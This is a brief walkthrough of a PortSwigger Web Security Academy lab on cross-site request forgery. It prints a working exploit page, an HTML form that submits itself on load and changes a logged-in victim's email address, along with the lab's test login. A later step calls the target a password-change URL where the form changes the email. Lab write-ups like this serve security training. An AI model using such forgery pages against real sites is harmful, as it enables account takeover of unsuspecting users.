
https://portswigger.net/web-security/csrf/lab-no-defenses


This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter



1) perform login as wiener:peter
2) go on my-account and see that the form  for changing the email has no csrf token and also ZAP says that there is no CSRF token protection

3)  copy the form from the original page and insert it into the exploit page
<html>
<body>
<form class="login-form" name="change-email-form" action="https://0a5f002f03c6a8638194a763004e00fa.web-security-academy.net/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required="" type="email" name="email" value="malicious3@email.com">
                            <button class="button" type="submit"> Update email </button>
</form>


<script>
           document.forms[0].submit()
</script>

</body>
</html>



in value insert the new email to assign to the victim and in the action insert the entire url for the password changing

4) send to the victim
